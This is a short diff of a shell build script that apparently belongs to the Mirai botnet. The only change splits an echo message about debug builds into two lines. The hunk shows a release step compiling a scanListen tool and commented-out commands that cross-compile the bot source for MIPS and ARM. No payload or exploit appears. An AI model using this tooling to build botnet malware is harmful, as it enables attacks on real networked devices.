@@ -50,7 +50,8 @@ elif [ "$1" == "release" ]; then
     go build -o release/scanListen tools/scanListen.go
     echo "Compilation is finished."
 elif [ "$1" == "debug" ]; then
-    echo "Please note that we have made it impossible to compile with debugging. If you want to compile with debugging, please remove #."
+    echo "Please note that we have made it impossible to compile with debugging."
+    echo "If you want to compile with debugging, please remove #."
     #gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
     #mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
     #armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
